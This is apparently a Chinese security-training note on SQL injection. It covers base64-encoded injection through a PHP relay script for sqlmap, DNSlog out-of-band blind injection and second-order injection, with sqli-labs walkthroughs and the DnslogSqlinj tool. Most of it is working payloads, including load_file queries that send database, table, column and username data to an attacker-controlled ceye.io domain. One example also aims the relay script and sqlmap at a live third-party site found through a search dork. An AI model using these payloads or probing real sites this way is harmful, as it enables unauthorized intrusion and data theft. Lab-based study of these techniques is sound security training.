![](https://gitee.com/YatJay/image/raw/master/img/202202130952426.png)

# 涉及知识

## 加解密注入

### 定义

提交的参数采用了base64等加密方式将数据进行加密，再通过参数传递给服务器

### 举例

对于  www.xxx.com/index.php?id=MQ==

- 加密部分：MQ==

- 解密结果：id=MQ==相当于id=1

对于   base64加密结果：MSBhbmQgMT0x

则提交语句为：www.xxx.com/index.php?id=MSBhbmQgMT0x

### 附：中转注入

比如受害者网站URL注入点是经过编码的，不能直接结合sqlmap进行漏洞利用，所以本地搭建一个网站，写一个php脚本编码文件，就可以结合sqlmap工具进行测试。因为，注入点经过复杂编码之后，就不能直接结合sqlmap进行漏洞攻击了。或者sqlmap自己编写tamper脚本进行攻击

以SQL加解密注入为例，如果我们所使用的工具不提供加密模块(burp和sqlmap都是提供加密模块的)，就需要自己编写脚本实现提交参数的加密工作。脚本的目的是当提交明文数据时先把明文发送到中转文件进行加密操作，然后再发送请求

#### 中转注入示例代码

```php
<?php
$url='http://xxxx/job_bystjb/yjs_byszjs.asp?id=';  //声明url
$payload=base64_encode($_GET['x']); //对GET方法提交的数据x进行加密
echo $payload;  //输出加密后的待提交参数
$urls=$url.$payload;  //连接两个字符串
file_get_contents($urls);//file_get_contents()将整个文件读入一个字符串，此处即意思是访问$urls，获取其中的内容
echo $urls;
?>
```

#### 示例

搜索引擎搜索：inurl:id=MQ==

地址：http://www.techen.cn/about_us.php?ID=MQ==

以下文件名：www/test.php

```php
<?php
$url='http://www.techen.cn/about_us.php?ID=';
$payload=base64_encode($_GET['x']);
echo $payload;
$urls=$url.$payload;
file_get_contents($urls);//请求拼接后的地址
echo $urls;
?>
```

在sqlmap中对中转注入代码进行注入测试，命令如下

`python sqlmap.py -u “http://127.0.0.1/test.php?x=” -v 3`

![](https://gitee.com/YatJay/image/raw/master/img/202202152150419.png)

测试结果不存在注入点，掌握此中转过程即可，在没有加密插件时使用。

## DNSlog注入

### DNSlog盲注利用条件

需要数据库用户权限为高权限，因为DNSlog注入需要用户有文件读写操作的权限。有时即使有了文件读写权限，但是后门文件写不进去，这时就可以利用DNSlog注入

因此在数据库配置文件mysql.ini中参数secure_file_priv必须为空(不是null，而是不写)

| secure_file_priv配置   | 含义                                                         |
| ---------------------- | ------------------------------------------------------------ |
| secure_file_priv为null | 不允许导入导出                                               |
| secure_file_priv为/tmp | 导入导出只能在/tmp目录下                                     |
| secure_file_priv为空   | 不作限制允许导入导出（注意NULL不是我们要的空，NULL和空的类型不一样） |

### 适用场景

1. DNSlog注入解决了SQL盲注不能回显数据，效率低的问题

2. 挖到一个有SQL盲注的站点，可是用sqlmap跑需要频繁请求，最后导致ip被ban

3. 发现疑似命令注入的洞，但是目标站点什么也不显示，无法确认是不是有洞

总之就是目标不让信息显示出来，如果能发送请求，那么就可以尝试咱这个办法——用DNSlog来获取回显

（1）SQL注入中的盲注

（2）XSS盲打

（3）无回显的命令执行

（4）无回显的SSRF

（5）无回显的XXE（Blind XXE）

### 工具

#### DNSlog注入工具

https://github.com/ADOOO/DnslogSqlinj

#### 在线DNS解析平台

如果有自己的服务器和域名，可以自建一个这样的平台，直接使用BugScan团队开源的工具搭建即可：

https://github.com/BugScanTeam/DNSLog

另外我们也可以使用在线平台：

[http://ceye.io](http://ceye.io/)

[http://www.dnslog.cn](http://www.dnslog.cn/)

### DNSlog盲注操作方式

#### Payload1：

```sql
?Id=1’and load_file(concat('\\\\',(select database()),'.c4d3hg.ceye.io\\sql'))--+
//相应的更换 select database()查询语句便可以实现DNS外带的回显注入，其中c4d3hg.ceye.io为ceye.io平台给每个账号的昵称
```

查询当前数据库：

```sql
and load_file(concat('\\\\',(select database()),'.c4d3hg.ceye.io\\sql'))--+
//xtftm5.ceye.io根据ceye平台给你的域名更改，\\sql是域名目录，随意即可，select database()换成sql注入payload即可
```

查询表名：

```sql
and load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema='security'limit 0,1),'.c4d3hg.ceye.io\\sql'))--+
```

查询列名：

```sql
and load_file(concat('\\\\',(select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),'.c4d3hg.ceye.io\\sql'))--+
```

查询数据：

```sql
and load_file(concat('\\\\',(select username from users limit 0,1),'.c4d3hg.ceye.io\\sql'))--+
```

#### Payload2：

```sql
and (select load_file(concat('\\\\',(select database()),'.c4d3hg.ceye.io\\aaa')))#
```

原理跟上面差不多

## 二次注入

### 定义

所谓二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到SQL 查询语句中导致的注入。 二次注入是sql注入的一种，但是比普通sql注入利用更加困难，利用门槛更高。 普通注入数据直接进入到SQL 查询中，而二次注入则是输入数据经处理后存储，取出后，再次进入到SQL 查询。

### 原理

二次注入的原理，在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是脏数据。

在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。

![](https://gitee.com/YatJay/image/raw/master/img/202202151543887.png)



# 演示案例

## sqlilabs-less21-cookie&加解密注入(实际案例)

目标地址：http://localhost/pentest/sqlilabs/Less-21/

admin-admin登录后抓包可以看到GET数据包的Cookie中uname=YWRtaW4%3D，熟悉编码可以知道%3D是‘=’的URL编码

==这里笔者猜测是先将明文进行一次base64编码，然后再对base64密文进行一次URL编码后提交==

![](https://gitee.com/YatJay/image/raw/master/img/202202150945726.png)

勾选密文后发送到Decoder模块进行解密

![](https://gitee.com/YatJay/image/raw/master/img/202202151035601.png)

可见确实如上述猜测。



通过查看后台源码可以知道，**提交的数据经过加密算法加密后存在变量当中，带入数据库查询时先调用解密算法解密后，再将明文拼接成SQL语句带入数据库查询，因此进行SQL注入提交数据时就要先把注入语句按照同样加密算法加密，之后再做提交，这样在后台解码后，才能执行我们想要执行的SQL注入语句，而如果提交数据时还是像以前一样提交明文，则必然后台解码得不到我们所愿的SQL注入语句。**

知道数据提交的机制之后，我们进行SQL注入测试

**注意：MySQL单行注释之区别**

​	`#`和`--`的区别就是：`#`后面直接加注释内容，而`--`的第 2 个破折号后需要跟一个空格符在加注释内容。在构造注入语句欲使得注释后面内容，请注意二者区别。

加密注入语句

![](https://gitee.com/YatJay/image/raw/master/img/202202151111061.png)

提交后报错，根据报错信息得知还需要在单引号后加上右括号

- admin') 然后进行编码，报错

- admin')#然后进行编码，回显正常

说明闭合方式为 ('xxxxxxxxxxxxx')

接下来提交带有注入语句并且编码加密后的数据包

测试是否存在——存在注入点

![](https://gitee.com/YatJay/image/raw/master/img/202202151132405.png)

![](https://gitee.com/YatJay/image/raw/master/img/202202151137937.png)

order by确定结果字段数量——3

![](https://gitee.com/YatJay/image/raw/master/img/202202151143764.png)

select 1,2,3确定显示位置

![](https://gitee.com/YatJay/image/raw/master/img/202202151143812.png)

确定数据库名、用户名、数据库版本——security、root、5.5.53

![](https://gitee.com/YatJay/image/raw/master/img/202202151145457.png)

确定表名

![](https://gitee.com/YatJay/image/raw/master/img/202202151148065.png)

确定列名

![](https://gitee.com/YatJay/image/raw/master/img/202202151149712.png)

查询指定数据

![](https://gitee.com/YatJay/image/raw/master/img/202202151151943.png)

之后同理

## sqlilabs-less24-post 登陆框&二次注入(实际案例)

地址：http://localhost/pentest/sqlilabs/Less-24/

访问案例地址，是一个注册登录页面，为测试二次注入，我们在注册时有意写一个带有注入参数的用户名传递到数据库中

![](https://gitee.com/YatJay/image/raw/master/img/202202152106453.png)

查看数据库，注册用户名成功

![](https://gitee.com/YatJay/image/raw/master/img/202202152107850.png)





### 关于用户名长度限制的两种方式

#### 前端长度限制

限制提交数据长度的代码写在HTML里面，可以直接检查页面源代码进行修改后再提交数据，直接突破长度限制

比如Google搜索框前端中长度限制就是2048字节，但修改前端之后仍无法提交过长的输入

![](https://gitee.com/YatJay/image/raw/master/img/202202151555170.png)

#### 后端长度限制

限制提交数据长度的代码写在PHP代码里面，不容易突破。

## sqlilabs-less9-load_file&dnslog带外注入(实际案例)

注册一个第三方DNS解析平台：http://ceye.io/  知道创宇的DNS平台

![](https://gitee.com/YatJay/image/raw/master/img/202202160006393.png)

查询当前数据库名：

```sql
http://localhost/pentest/sqlilabs/Less-9/?id=1'and load_file(concat('\\\\',(select database()),'.c4d3hg.ceye.io\\sql'))--+
```

![1626268713_60eee42920f8528632b38.png!small?1626268713117](https://image.3001.net/images/20210714/1626268713_60eee42920f8528632b38.png!small?1626268713117)

回显的数据

![1626268723_60eee43360cafc71599ff.png!small?1626268725107](https://image.3001.net/images/20210714/1626268723_60eee43360cafc71599ff.png!small?1626268725107)

查询当前数据库的第一个表名：

```sql
http://localhost/pentest/sqlilabs/Less-9/?id=1'and load_file(concat('\\\\',(select table_name from information_schema.tables where table_schema='security'limit 0,1),'.c4d3hg.ceye.io\\sql'))--+
```

![1626268773_60eee4654f0a1b325ef13.png!small?1626268773449](https://image.3001.net/images/20210714/1626268773_60eee4654f0a1b325ef13.png!small?1626268773449)

可以看到这里成返回了第一个表的名字

依次类推可以推出users表

查询第users表一个列名：

```sql
http://localhost/pentest/sqlilabs/Less-9/?id=1'and load_file(concat('\\\\',(select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),'.c4d3hg.ceye.io\\sql'))--+
```

![1626268799_60eee47f0c2f9d0845d0e.png!small?1626268798947](https://image.3001.net/images/20210714/1626268799_60eee47f0c2f9d0845d0e.png!small?1626268798947)

查询users表的username列的数据：

```sql
http://localhost/pentest/sqlilabs/Less-9/?id=1'and load_file(concat('\\\\',(select username from users limit 0,1),'.c4d3hg.ceye.io\\sql'))--+
```

![1626268814_60eee48e0b6e4d99d9953.png!small?1626268813976](https://image.3001.net/images/20210714/1626268814_60eee48e0b6e4d99d9953.png!small?1626268813976)

需要注意的点：

查询当前用户时,因为结果中有@符号，使用dnslog注入时，需要使用hex函数进行转码，再将查询到的hex转码后的数据解码即可，如下：

如果使用group_concat函数进行快读查询，也同样需要hex转码，利用如下：

```sql
http://localhost/pentest/sqlilabs/Less-9/?id=1'and load_file(concat('\\\\',(select hex(group_concat(table_name)) from information_schema.tables where table_schema='security'),'.c4d3hg.ceye.io\\sql'))--+
```

![1626268850_60eee4b26a7955fc144e7.png!small?1626268850513](https://image.3001.net/images/20210714/1626268850_60eee4b26a7955fc144e7.png!small?1626268850513)

![1626268862_60eee4be97d15b52c7aff.png!small?1626268862589](https://image.3001.net/images/20210714/1626268862_60eee4be97d15b52c7aff.png!small?1626268862589)

查询到的是hex编码的结果

![1626268884_60eee4d43a1d2a403355a.png!small?1626268884241](https://image.3001.net/images/20210714/1626268884_60eee4d43a1d2a403355a.png!small?1626268884241)

## py-Dnslogsqlinj工具使用——dnslog 注入演示脚本演示(实际案例)

项目地址：https://github.com/ADOOO/DnslogSqlinj  DNSlog注入工具

需要使用python27环境

首先需要修改配置文件:

![](https://gitee.com/YatJay/image/raw/master/img/202202152336565.png)

对于Less-9进行测试(本地地址为：http://localhost/pentest/sqlilabs/Less-9/?id=1)，使用语句如下：

获取数据库名:

`python dnslogSql.py -u "http://localhost/pentest/sqlilabs/Less-9/?id=1' and ({})--+" --dbs`

获取数据库security下的表名:

`python dnslogSql.py -u "http://localhost/pentest/sqlilabs/Less-9/?id=1' and ({})--+" -D security --tables`

获取users表的列名:

`python dnslogSql.py -u "http://localhost/pentest/sqlilabs/Less-9/?id=1' and ({})--+" -D security -T users --columns`

获取uses表中的数据:

`python dnslogSql.py -u "http://localhost/pentest/sqlilabs/Less-9/?id=1' and ({})--+" -D security -T users -C username,password --dump`

或直接使用`python dnslogSql.py -u "http://localhost/pentest/sqlilabs/Less-9/?id=1' and ({})--+"`进行测试

![](https://gitee.com/YatJay/image/raw/master/img/202202152346613.png)

# 涉及资源

- http://ceye.io/  知道创宇的DNS平台

- https://github.com/ADOOO/DnslogSqlinj  DNSlog注入工具

- https://www.bbsmax.com/A/A2dmVVQBze/   Sqlmap注入Base64编码的注入点：

- https://www.freebuf.com/column/184587.html

- https://www.cnblogs.com/renhaoblog/p/12912452.html

- https://www.pianshen.com/article/9561325277/

- https://github.com/bugscanteam/dnslog/(自己搭建dnslog服务器)

- PHP脚本
```php
<?php
$url='http://xxxx/job_bystjb/yjs_byszjs.asp?id=';  //声明url
$payload=base64_encode($_GET['x']);
echo  $payload;
$urls=$url.$payload;
file_get_contents($urls);
echo$urls;
?>
```

